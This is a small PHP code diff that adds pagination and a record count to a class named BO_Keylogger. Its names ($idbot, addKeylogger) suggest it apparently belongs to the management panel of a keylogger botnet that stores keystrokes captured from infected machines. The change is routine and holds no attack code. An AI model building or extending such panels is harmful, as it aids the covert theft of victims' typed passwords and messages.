@@ -8,10 +8,15 @@ class BO_Keylogger
         $daoKeylogger = new DAO_Keylogger();
         $daoKeylogger->addKeylogger($idbot, $detail, $content);
     }
-    public function getListKeylogger($idbot)
+    public function getListKeylogger($idbot,$page)
     {
         $daoKeylogger = new DAO_Keylogger();
-        return $daoKeylogger->getListKeylogger($idbot);
+        return $daoKeylogger->getListKeylogger($idbot,$page);
+    }
+    public function getCountListKeylogger($idbot)
+    {
+        $daoKeylogger = new DAO_Keylogger();
+        return $daoKeylogger->getCountListKeylogger($idbot);
     }
     public function getKeyloggerDetail($idKeylogger)
     {
